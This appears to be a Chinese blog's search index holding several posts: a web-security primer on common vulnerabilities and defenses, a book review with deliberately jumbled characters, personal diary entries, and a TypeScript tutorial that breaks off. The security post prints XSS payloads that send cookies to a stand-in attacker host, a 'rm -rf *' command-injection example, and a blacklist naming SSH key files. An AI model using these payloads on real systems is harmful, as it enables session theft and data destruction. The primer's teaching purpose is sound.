<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web安全简答</title>
      <link href="/2023/05/13/web%E5%AE%89%E5%85%A8%E7%AE%80%E7%AD%94/"/>
      <url>/2023/05/13/web%E5%AE%89%E5%85%A8%E7%AE%80%E7%AD%94/</url>
      
        <content type="html"><![CDATA[<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><ul><li>简介</li></ul><blockquote><p>越权漏洞分为垂直越权和水平越权，是开发者对用户访问的资源没有进行合适的权限校验导致可以访问或操作其他权限内容或者其他用户数据</p></blockquote><!-- ![越权漏洞](https://cdn.jsdelivr.net/gh/bitjian/blogimg@main/2023/05/越权漏洞_20230513114056.png) --><img src="https://cdn.jsdelivr.net/gh/bitjian/blogimg@main/2023/05/越权漏洞_20230513114056.png" width="500px" height="500px" /><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><img src="https://cdn.jsdelivr.net/gh/bitjian/blogimg@main/2023/05/垂直越权_20230513114159.png" width="500px" height="500px" /><blockquote><p>低级别的攻击者可以访问高级别权限用户的资源</p></blockquote><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><blockquote><p>例如：某管理平台对管理页面和请求接口没有做权限校验只是通过路由隐藏页面，攻击者A探出管理员的用户管理地址从而可以访问操作用户数据，从而达到权限提升的目的</p></blockquote><h4 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h4><blockquote><p>1.例如：不要相信用户没有编辑权限，就无法访问编辑页面进行编辑操作，需要对编辑接口做权限校验<br>2.不要只通过隐藏路由来达到权限控制的目的，要采取基煜角色，功能进行防控控制和校验<br>3.用户访问功能时，验证用户权限和规定的功能权限是否需相同  </p></blockquote><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><!-- ![水平漏洞](https://cdn.jsdelivr.net/gh/bitjian/blogimg@main/2023/05/水平越权_20230513114140.png =100*100) --><img src="https://cdn.jsdelivr.net/gh/bitjian/blogimg@main/2023/05/水平越权_20230513114140.png" width="500px" height="500px" /><blockquote><p>处于同级别用户，攻击者通过修改请求数据可以访问到其他用户的数据</p></blockquote><h4 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h4><blockquote><p>例如： 某日记软件，攻击者A删除日记的时候，修改了请求数据中的日志id为用户B的日记id，这个时候操作就会删除用户B的数据</p></blockquote><h4 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h4><blockquote><p>1.对内容进行访问或操作的时候，需要校验用户信息<br>2.例如对日记内容和用户需要进行数据绑定  </p></blockquote><!-- ![越权漏洞防护](https://cdn.jsdelivr.net/gh/bitjian/blogimg@main/2023/05/越权漏洞防护-5bc4f0a7ecda3ad954dc320572d379c4.webp) --><img src="https://cdn.jsdelivr.net/gh/bitjian/blogimg@main/2023/05/越权漏洞防护-5bc4f0a7ecda3ad954dc320572d379c4.webp" width="500px" height="500px" /><h2 id="csrf跨站请求伪造"><a href="#csrf跨站请求伪造" class="headerlink" title="csrf跨站请求伪造"></a>csrf跨站请求伪造</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>在用户处于登录状态的情况下，攻击者利用用户存在浏览器的用户凭证，对服务器进行请求，而服务器没有进行防护从而导致客户数据受到篡改  </p></blockquote><h3 id="场景-2"><a href="#场景-2" class="headerlink" title="场景"></a>场景</h3><blockquote><p>用户在某银行网站登录了自己的账号，然后转到某贴吧网站去发送评论，点击发送评论结果自己账户的钱少了，因为攻击者在发送评论的时候其实是在利用用户的cookie信息进行转账请求<br><img src="https://cdn.jsdelivr.net/gh/bitjian/blogimg@main/2023/05/csrf-20200322223026-ac2230dc-6c49-1.jpg" width="500px" height="500px" /></p></blockquote><h3 id="防护-2"><a href="#防护-2" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.接口处理的时候增加请求头referer校验<br>2.在进行接口请求的时候需要输入验证码，附带验证码信息<br>3.在请求头中增加自定义随机值校验<br>4.利用csrftoken<br>5.对于请求尽量是用POST，防止用户随便点击一个链接就发送了攻击请求  </p></blockquote><h2 id="xss跨站脚本攻击"><a href="#xss跨站脚本攻击" class="headerlink" title="xss跨站脚本攻击"></a>xss跨站脚本攻击</h2><blockquote><p>攻击者尝试通过以下几种方式将攻击脚本注入到web页面<br>从而实现获取用户凭证信息，弹窗骚扰, url跳转，控制用户浏览器等目的  </p></blockquote><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><blockquote><p>攻击者尝试构建一个带有脚本攻击的链接让用户点击，用户点击链接后，后台服务器对链接里带有脚本的参数没有处理返回给浏览器，浏览器会执行页面中嵌入的恶意脚本  </p></blockquote><h4 id="场景-3"><a href="#场景-3" class="headerlink" title="场景"></a>场景</h4><blockquote><p>例如用户点击了攻击者构建的url: <a href="https://xxx.com/test?message=">https://xxx.com/test?message=</a>&lt;script&gt;var+i&#x3D;new+Image;+i.src&#x3D;”<a href="http://gongji.com/%22%2bdocument.cookie">http://gongji.com/&quot;%2bdocument.cookie</a>;&lt;&#x2F;script&gt;,这个时候服务器将message内容返回给浏览器，浏览器执行message脚本内容，导致cookie被发送到攻击者的服务器上  </p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="keyword">new</span> <span class="title class_">Image</span>; </span><br><span class="line">i.<span class="property">src</span>=<span class="string">&quot;http://gongji.com/&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/bitjian/blogimg@main/2023/05/xss反射-b7cgfu8bqs.jpeg"  /><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><blockquote><p>根据用户的输入，而页面直接直接按html处理用户的输入，这个时候攻击者就可以在输入的时候，插入一段恶意脚本造成攻击<br>DOM跨站攻击与另外两个类型的区别是，DOM是存页面级别的，只有规范使用javascript才可以防御  </p></blockquote><h4 id="场景-4"><a href="#场景-4" class="headerlink" title="场景"></a>场景</h4><blockquote><p>在某论坛页面，攻击者在评论里输入 &lt;script type&#x3D;”text&#x2F;javascript” &gt; var img &#x3D; document.createElement(“img”); img.src&#x3D;”<a href="https://gongji/log">https://gongji/log</a>“ + escape(document.cookie); document.body.append(img) &lt;&#x2F;script &gt;，<br>这个每个访问到这条评论的用户都会把cookie发送到攻击者的服务器上</p></blockquote><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><blockquote><p>和DOM型差不多，只不过是把脚本存到了后台，当访问的时候后台服务器没有对脚本过滤，同样返回给浏览器，浏览器执行了脚本</p></blockquote><h3 id="防护-3"><a href="#防护-3" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.在服务端对用户输入的参数中特殊字符进行进行转义，例如&lt; ，&gt; ，’ ，”，&amp;等字符进行转义 &lt; 转换为 &amp;lt，或者使用xss防护插件xss-filter<br> <img src="https://cdn.jsdelivr.net/gh/bitjian/blogimg@main/2023/05/xss转义_20230513180713.png" /><br>2.在服务器进行输入验证，包括输入的数据类型、数据长度、数据格式<br>3.使用CSP禁止加载外部域代码<br>4.使用httponly禁止javasscript读取敏感的cookie<br>5.如果涉及URL目的跳转(例如location.replace、location.href等)或者涉及使用innerHTML、document.write、eval等敏感函数，必须对输入内容做特殊字符转义<br>6.涉及对内容多次编码处理的时候防止由于反编码操作导致无害的编码内容反编码成有害的脚本  </p></blockquote><h2 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h2><h3 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h3><blockquote><p>在上传文件的时候没有对文件类型、格式、内容进行合法性校验，导致攻击者可以上传Webshell(.php, .jsp, asp等)恶意脚本文件，导致服务器被入侵，上传HTML、Flash文件可导致XSS攻击  </p></blockquote><h3 id="场景-5"><a href="#场景-5" class="headerlink" title="场景"></a>场景</h3><blockquote><p>1.在上传图片过程中，只判断了mime-type和后缀名，而没有判断文件类型的实际文件类型，导致攻击者可以通过修改请求的mimeType和文件后缀名，而实际上传的是HTML或者webshell等脚本<br>2.上传图片过程中，由于svg图片是一种XML的二维矢量格式，导致攻击者可以在svg里注入script脚本导致xss跨站脚本攻击<br>3.上传m3u视频格式，由于m3u视频格式实际是存放视频的索引文件，播放软件还会根据里面网络地址去下载播放，而这写地址就可能导致ssrf漏洞  </p></blockquote><h3 id="防护-4"><a href="#防护-4" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.采用白名单校验，在上传过程中需要去判断文件二级制里的文件类型<br>2.服务端对上传文件进行重命名，防止利用目录跳转等防止控制上传目录<br>3.上传图片格式尽量不上传svg图片格式，svg图片可以img标签渲染出来，具体防护可参考 ![<a href="https://svg.digi.ninja]">https://svg.digi.ninja]</a><br>4.对上传可以进行频率限制还有回显地址可以处理一下，尽量不显示具体路径  </p></blockquote><h2 id="ssrf服务端请求伪造"><a href="#ssrf服务端请求伪造" class="headerlink" title="ssrf服务端请求伪造"></a>ssrf服务端请求伪造</h2><h3 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h3><blockquote><p>服务器提供了从其他服务器访问内容的功能，从而访问到攻击者恶意构造的地址，如果接收的目标URL是解析到内网的，则服务器会尝试访问内网，从而对内网进行攻击和端口扫描，访问敏感文件  </p></blockquote><h3 id="场景-6"><a href="#场景-6" class="headerlink" title="场景"></a>场景</h3><blockquote><p>1.客户端在某个接口请求中可以自己构建一个请求，传给服务器，或者在上传文件中通过某种格式，可以将某种可以访问内网的的特殊文件，传入服务器上  </p></blockquote><h3 id="防护-5"><a href="#防护-5" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.解析目标URL,判断其schem、host、iP<br>2.当服务器需要访问内网机器的时候，可以利用白名单，只有白名单的ip和协议还有端口才可以发访问  </p></blockquote><h2 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h2><h3 id="简介-6"><a href="#简介-6" class="headerlink" title="简介"></a>简介</h3><blockquote><p>由于没有做频率限制，导致攻击者可以一直调用发送短信的接口，给用户造成困扰  </p></blockquote><h3 id="场景-7"><a href="#场景-7" class="headerlink" title="场景"></a>场景</h3><blockquote><p>某平台短信验证功能，由于没有做评率限制，导致攻击者可以在输入手机号码后，一直给该号码发送验证码短信  </p></blockquote><h3 id="防护-6"><a href="#防护-6" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.对手机号码有效性做校验<br>2.对下发的评率做限制，例如一个手机号1分钟只能下发1次，一天只能发送10次  </p></blockquote><h2 id="xxe攻击"><a href="#xxe攻击" class="headerlink" title="xxe攻击"></a>xxe攻击</h2><h3 id="简介-7"><a href="#简介-7" class="headerlink" title="简介"></a>简介</h3><blockquote><p>当攻击者构建了一个带有恶意内容的外部实体xml未正确配置XML解析器的时候，然后上传到服务器，导致攻击者可以利用XXE获取本地敏感文件，主机IP，端口，攻击内网等  </p></blockquote><h3 id="场景-8"><a href="#场景-8" class="headerlink" title="场景"></a>场景</h3><blockquote><p>某功能支持通过excel方式导入联系人，xmls文件解压后会生成一个xml文件，然后可以修改xml文件注入外部实体，再打包成xmls上传  </p></blockquote><h3 id="防护-7"><a href="#防护-7" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.在代码层面关闭XML实体加载<br>2.过滤用户提交的xml中关键词，如：SYSTEM,PUBLIC  </p></blockquote><h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><h3 id="简介-8"><a href="#简介-8" class="headerlink" title="简介"></a>简介</h3><blockquote><p>攻击者制造一个网页，例如红包领取等诱导用户点击，但是点击区域其实有一层透明的iframe覆盖在上面，当点击的时候就会点击到iframe里的内容（例如某银行的转账页面按钮），如果用户还保留了该iframe里的cookie，则会造成用户信息篡改的风险。  </p></blockquote><h3 id="防护-8"><a href="#防护-8" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.检测自己的网页是否为顶层页面  </p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span> !== top &amp;&amp; (top.<span class="property">location</span>.<span class="property">href</span> = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>)</span><br></pre></td></tr></table></figure><blockquote><p>2.设置http头部X-Frame-Options选项  </p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">DENY</span>: 浏览器拒绝加载任何frame页面</span><br><span class="line"><span class="attr">SAMEORIGIN</span>: frame页面的地址只能是同域名下的页面</span><br></pre></td></tr></table></figure><h2 id="浮点数计算漏洞"><a href="#浮点数计算漏洞" class="headerlink" title="浮点数计算漏洞"></a>浮点数计算漏洞</h2><h3 id="简介-9"><a href="#简介-9" class="headerlink" title="简介"></a>简介</h3><blockquote><p>由于javascript计算会有精度问题，导致后续代码逻辑没有兼容浮点而造成问题    </p></blockquote><h3 id="防护-9"><a href="#防护-9" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.可以使用高精度工具去处理计算逻辑<br>2.在输入的时候进行校验，只传整数类型就不要运行浮点类型  </p></blockquote><h2 id="目录穿透"><a href="#目录穿透" class="headerlink" title="目录穿透"></a>目录穿透</h2><h3 id="简介-10"><a href="#简介-10" class="headerlink" title="简介"></a>简介</h3><blockquote><p>在下载和读取文件的时候，服务器更具传入的路径去查询文件，当路径里包含 <code>../</code>等符号，而服务器也根据地址去查询就会导致跳转到其他目录，从而返回系统敏感文件给用户   </p></blockquote><h3 id="防护-10"><a href="#防护-10" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.用正则匹配路径，当碰到 <code>../</code>符号的时候，就阻止逻辑执行或者将<code>../</code>转换为空字符串   </p></blockquote><h2 id="命令注入攻击"><a href="#命令注入攻击" class="headerlink" title="命令注入攻击"></a>命令注入攻击</h2><h3 id="简介-11"><a href="#简介-11" class="headerlink" title="简介"></a>简介</h3><blockquote><p>在服务器需要执行用户传入的命令的时候，攻击者构造恶意的参数其中包含一些恶意命令，从而导致服务器执行恶意命令  </p></blockquote><h3 id="场景-9"><a href="#场景-9" class="headerlink" title="场景"></a>场景</h3><blockquote><p>例如用户需要执行<code>npm run build</code>命令，而攻击者构造<code>npm run build;rm -rf *</code>命令，而导致服务器遭到攻击  </p></blockquote><h3 id="防护-11"><a href="#防护-11" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.在代码级调用shell命令，需要对特殊字符进行过滤，例如(<code>|</code> <code>&amp;</code> <code>;</code>等)，防止执行其他构造的命令<br>2.根据业务进行白名单正则校验<br>3.禁用一些敏感命令例如 <code>eval</code> <code>system</code> <code>exec</code> <code>shell_exec</code>等函数  </p></blockquote><h2 id="url跳转漏洞"><a href="#url跳转漏洞" class="headerlink" title="url跳转漏洞"></a>url跳转漏洞</h2><h3 id="简介-12"><a href="#简介-12" class="headerlink" title="简介"></a>简介</h3><blockquote><p>服务器会接受用户输入的跳转地址，并返回302响应或者URL重定向，攻击者可以利用该漏洞操控输入的URL，可以欺骗用户跳转到不安全的页面，造成钓鱼攻击</p></blockquote><h3 id="防护-12"><a href="#防护-12" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.避免这种接受用户输入跳转功能和重定向功能<br>2.将重定向地址放在服务器端<br>3.利用白名单，只能在白名单列表里进行跳转  </p></blockquote><h2 id="sql注入攻击"><a href="#sql注入攻击" class="headerlink" title="sql注入攻击"></a>sql注入攻击</h2><h3 id="简介-13"><a href="#简介-13" class="headerlink" title="简介"></a>简介</h3><blockquote><p>服务器接受客户端构建的sql语句，然后直接执行而没有对字段类型做校验，特殊字符做过滤，从而导致数据库返回结果超出了设计的预期结果，导致数据库数据泄露，个人私密信息，交易信息被盗取等</p></blockquote><h3 id="防护-13"><a href="#防护-13" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.过滤或转义特殊字符，例如 <code>&#39;</code>转义为 <code>\&#39;</code>,还有 <code>&quot;</code>,<code>&lt;</code>,<code>&gt;</code>,<code>&amp;</code>,<code>*</code>,<code>;</code>等<br>2.使用预编译语句&amp;参数化查询，不要使用参数拼接到sql语句里<br>3.数据库用户使用最小权限原则  </p></blockquote><h2 id="用户敏感信息泄露"><a href="#用户敏感信息泄露" class="headerlink" title="用户敏感信息泄露"></a>用户敏感信息泄露</h2><h3 id="简介-14"><a href="#简介-14" class="headerlink" title="简介"></a>简介</h3><blockquote><p>由于没有对用户隐私数据加密或者屏蔽，例如将数据库手机号，身份证号原样输出到客户端</p></blockquote><h3 id="防护-14"><a href="#防护-14" class="headerlink" title="防护"></a>防护</h3><blockquote><ol><li>不要在客户端，LocalStorage,Cookie上保存密码等敏感信息</li><li>设计个人隐私数据需要脱敏后显示给用户</li><li>设计敏感信息查询需要对访问频率做限制，防止核心数据被爬取</li></ol></blockquote><h2 id="错误信息泄露"><a href="#错误信息泄露" class="headerlink" title="错误信息泄露"></a>错误信息泄露</h2><h3 id="简介-15"><a href="#简介-15" class="headerlink" title="简介"></a>简介</h3><blockquote><p>由于服务器在捕获错误信息时，直接将错误信息抛出给客户端，而错误信息中包含服务器绝对路径，sql片段，源代码等信息泄露</p></blockquote><h3 id="防护-15"><a href="#防护-15" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.线上需要关闭debug模式<br>2.错误信息统一自定义返回处理，而不是直接把错误信息返回</p></blockquote><h2 id="服务器目录泄露"><a href="#服务器目录泄露" class="headerlink" title="服务器目录泄露"></a>服务器目录泄露</h2><h3 id="简介-16"><a href="#简介-16" class="headerlink" title="简介"></a>简介</h3><blockquote><p>在提交代码的时候，代码注释或者文件里包含服务器敏感信息</p></blockquote><h3 id="场景-10"><a href="#场景-10" class="headerlink" title="场景"></a>场景</h3><blockquote><ol><li>某用户提交代码把 Dockerfile, .DS_store发布到仓库上，攻击者通过某种方式获取到Dockerfile文件，而Dockerfile和.DS_store上包含服务器的敏感信息，从而攻击者可以访问服务器的敏感文件</li></ol></blockquote><h3 id="防护-16"><a href="#防护-16" class="headerlink" title="防护"></a>防护</h3><blockquote><p>1.禁止敏感文件提供客户访问<br>2.版本管理应该过滤readme.md，Dockerfile  .DS_store等文件  </p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑名单</span><br><span class="line">Dockerfile* *php.ini *php-fpm.conf *nginx.conf *.DS_Store *.gitmodules *pom.xml *Gruntfile.js *webpack.config.js *package.json *known_hosts *authorized_keys *config.ini</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.51cto.com/u_15183497/2737465">逻辑漏洞之越权漏洞</a><br><a href="https://vulwiki.readthedocs.io/zh_CN/latest/web/yuequan/">漏洞知识库-越权漏洞</a><br><a href="https://zhuanlan.zhihu.com/p/130919069">越权漏洞原理与防御</a><br><a href="https://xz.aliyun.com/t/7450">csrf攻击原理</a><br><a href="http://www.ttlsa.com/safe/xss-description/">反射xss攻击</a><br><a href="https://svg.digi.ninja/">svg文件防护</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读傲慢与偏见</title>
      <link href="/2023/04/25/%E8%AF%BB%E5%82%B2%E6%85%A2%E4%B8%8E%E5%81%8F%E8%A7%81/"/>
      <url>/2023/04/25/%E8%AF%BB%E5%82%B2%E6%85%A2%E4%B8%8E%E5%81%8F%E8%A7%81/</url>
      
        <content type="html"><![CDATA[<h2 id="读《傲慢与偏见》"><a href="#读《傲慢与偏见》" class="headerlink" title="读《傲慢与偏见》"></a>读《傲慢与偏见》</h2><hr><p>  书中了讲四起不遭同遇的婚姻:<br>  其中夏洛特感觉自年己龄大了变将自就己和爱慕虚荣普的信男柯林斯了结婚，这让直一把她当做好友朋的伊莎丽白怀疑人生，有人愿牺意牲未来的幸福成去全一个木得感的情婚姻，友谊的轮巨因方向同不而散了架。<br>  莉迪亚放荡不重自喜欢在混军官团里后最碰到渣男威科姆，沉迷在科威姆伪的装人格下他和私奔，最后还是高富帅达答西应帮威科姆还负清债，才初使科威姆答结应婚保住声了誉。<br>  简和一另个高富加帅暖男宾利在会舞一见钟情，曾度一撒狗粮把丽伊莎白喂的都用不吃饭了，然而这么的好开局一差点在宾亲利友包括达西教的唆和隐瞒下失联去系，好在达西一顿骚操挽作回她两的缘分归重于好。<br>  伊丽莎和白高傲冷男漠神一开始看互不顺眼，在次一一次想中见达西发现比起围周人因为贵族份身故意讨好，而伊丽莎白说敢敢言淘气的样还子挺有趣，然后这个高冷男神为以自己向丽伊莎白求婚，对面肯定欣会然接受，却不知道伊丽白莎对他偏太见深高傲无礼，吃一了次亏。达西连夜写信机找会送到伊莎丽白手上，伊丽莎白看完信消也除了偏见，最后达西还帮他了们家一个大忙，发现原来达西这格性真是……泰裤辣。</p><hr><p>  书里突出者作对爱婚情姻的一个评标判准，通过对话造塑了不同角色的形象，不感过触的是还故事里人物之的间书信往来交和际活动，在文章中出各现种大包事括感情问都题会写信回信，在信里讲述己自的心路历程和事对情的看法。那个时代的也人很喜欢交没际事就串串门吃吃饭，接着奏乐接着舞。比起现在，人的们娱乐方式变多了，沟通工变具快了，但是人与人之间距的离却更远了，也冷更漠了或许这是新时代的傲慢与偏见吧😳。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
          <category> 2023 </category>
          
          <category> 读/观后感 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找工作</title>
      <link href="/2022/06/26/%E6%89%BE%E5%B7%A5%E4%BD%9C/"/>
      <url>/2022/06/26/%E6%89%BE%E5%B7%A5%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>事业和爱情两个比较重大的选择题，毕业后经常看到有人在做，没怎么刷题的我也由此产生了错觉，这两道题的套路有点相像。</p><hr><p>近期压力山大，不免出现想换工作的想法，这个时代，不是公司觉得你没付出应有的劳动，觉得当初的员工都比你好，看不上你要裁你，就是你看不上公司这拉胯的福利，这xx的领导，这饿不死的工资要离开，要么互相磨合各自多看几眼，领导画的饼多吃几时。  </p><hr><p>想起一次和朋友聊天提到（不记得谁说的）：找下一个工作，我得刷面试题刷一个月。那如果换一个题目做，那就是：我找一个恋爱那得准备恋爱面试一个月。<br>我觉得这样的人应该很多，这都是有责任心的人，对待每一件事那都是尽力去试。但这也会导致一个问题，在刷题准备这过程中就得忍受着。已经有工作的人得忍受着现在的工作，没有工作的得忍受着失业的焦虑。当然以上只是一部分人找工作的方式。</p><hr><p>还有一部分人找工作是管他这么多，找工作找就对了，到处投简历，到处面试。这样也挺好，能短时间接触大量公司，也可以快速找到新的工作。但想在这大量公司里找出好的公司也是一个难事，面试容易的可能福利不好，公司好的可能面试难，既然已经这样行动了，那也不考虑这么多了，大不了工作履历上多几个公司，还可以继续换。</p><hr><p>大晚上还想说什么来着，想不起来不说了<br>“……”<br>“这个时代找工作难呀”<br>“……”<br>“工作没了会睡不着觉，但不谈恋爱肯定还能睡得很香”<br>“……”<br>“晚安好梦，文明发言”  </p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
          <category> 2022 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不想敲代码的一天</title>
      <link href="/2021/08/14/%E4%B8%8D%E6%83%B3%E6%95%B2%E4%BB%A3%E7%A0%81%E7%9A%84%E4%B8%80%E5%A4%A9/"/>
      <url>/2021/08/14/%E4%B8%8D%E6%83%B3%E6%95%B2%E4%BB%A3%E7%A0%81%E7%9A%84%E4%B8%80%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<p>昨天下着大雨请了一天假，请假的理由我到现在还没想好，在与懒惰斗争了20多年，这又输了一次。</p><hr><p>宅了一天，出门吃了个晚饭，外面夹着细雨的冷风吹地我起了一身的鸡皮疙瘩，看着路人都穿着外套走来走去，就我还穿个短袖短裤到处找饭馆，这才一天没出门，怎么就像到了深秋准备过冬的样子。<br>回家打了个哆嗦，突然想打LOL找找当年热血的感觉，下载点击打开LOL，通过weGame进来，没有进场动画和音乐总少了些感觉。进入到首页看到幸运商店本能的点击进去，随便点了一下，发现以前想买的皮肤三折优惠出现在我面前，要是在高中那估计是每天啃白馒头，吃泡面也得买下来，现在完全没有为它花钱的欲望，想到那时候做的傻行为就想笑。  </p><hr><p>那时候沉迷LOL，上课睡觉朝思暮想，想着想着忍不住了就翻墙出去，真有种“所爱隔山海，山海皆可平的”气势，这一堵墙算个球。来到网吧那打的每一场游戏，就像生死之战，调兵遣将，指挥全场，只要还有希望那就坚守到最后只为取得一场胜利，那智商估计都超频了，时不时还来一个秀翻天的操作，队友直呼666，打完也是脑门发热估计是散热跟不上。放下这游戏四五年了，现在再玩起来完全没有高中那时候的热情，只把它当做一场游戏娱乐一下，输赢也都无所谓，操作也跟不上了。点开好友列表发现以前经常玩的好友，邀请一起组队玩了一把，我选了一个不怎么要操作的辅助。<br>“上单你守一下，打不过就不要刚”，“中路等会配合我去抓一波上路”，“下路小心把视野做好，对面打野去下路了”，“听我指挥，别乱跑，打团战了”………  </p><hr><p>哈哈哈，这家伙不愧是忠实玩家，这对LOL一点没变。  </p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ts原始基础类型</title>
      <link href="/2020/09/06/%E5%8E%9F%E5%A7%8B%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/"/>
      <url>/2020/09/06/%E5%8E%9F%E5%A7%8B%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h4 id="1-js原始基础类型"><a href="#1-js原始基础类型" class="headerlink" title="1. js原始基础类型"></a>1. js原始基础类型</h4><p>原始数据类型的注解包括： 布尔值，数值，字符串，null, undefined</p><h4 id="2-布尔值"><a href="#2-布尔值" class="headerlink" title="2. 布尔值"></a>2. 布尔值</h4><p>1.使用boolean对布尔值进行注解</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">isDone</span>: boolean = <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>2.可以使用Boolen进行类型转换，但不能使用new Boolean构造函数创建, 其他基本类型也一样</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// isDone = new Boolean(1) // 报错，new Boolean 返回的是一个Boolen对象的实例</span></span><br><span class="line">isDone = <span class="title class_">Boolean</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="3-数值"><a href="#3-数值" class="headerlink" title="3. 数值"></a>3. 数值</h4><p>1.使用number对数值型进行注解</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">decNum</span>: number = <span class="number">6</span>  <span class="comment">// 10进制</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">float</span>: number = <span class="number">6.666666666</span>  <span class="comment">// 浮点数</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">hexNum</span>: number = <span class="number">0xf00d</span> <span class="comment">// 16进制</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">binaryNum</span>: number = <span class="number">0b101</span> <span class="comment">// 2进制</span></span><br><span class="line"><span class="keyword">let</span> octalNum = <span class="number">0o766</span> <span class="comment">// 8进制</span></span><br></pre></td></tr></table></figure><h4 id="4-字符串"><a href="#4-字符串" class="headerlink" title="4. 字符串"></a>4. 字符串</h4><p>1.使用string对字符串类型（包括模板字符串）进行注解</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">myName</span>: string = <span class="string">&#x27;Tom&#x27;</span>  <span class="comment">// 普通字符串</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">myAge</span>: number = <span class="number">25</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">sentence</span>: string = <span class="string">`Hello my name is <span class="subst">$&#123;myName&#125;</span></span></span><br><span class="line"><span class="string">i&#x27;ll be <span class="subst">$&#123;myAge + <span class="number">1</span>&#125;</span> years old next month`</span> <span class="comment">// 模板字符串</span></span><br></pre></td></tr></table></figure><h4 id="5-空值-void"><a href="#5-空值-void" class="headerlink" title="5. 空值 void"></a>5. 空值 void</h4><p>1.void 一般用来表示没有任何返回值的函数返回类型声明</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">alertName</span>(<span class="params"></span>): <span class="keyword">void</span> &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="string">&quot;My name is tom&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">unusable</span>: <span class="keyword">void</span> = <span class="literal">undefined</span>  <span class="comment">// 没有必要使用void注解，因为它只能被赋值为 null 或者 undefined</span></span><br></pre></td></tr></table></figure><h4 id="6-null-和-undefined"><a href="#6-null-和-undefined" class="headerlink" title="6. null 和 undefined"></a>6. null 和 undefined</h4><p>null 和 undefined 是所有类型的子类型，也就是可以赋值给所有类型<br>1.使用null 和 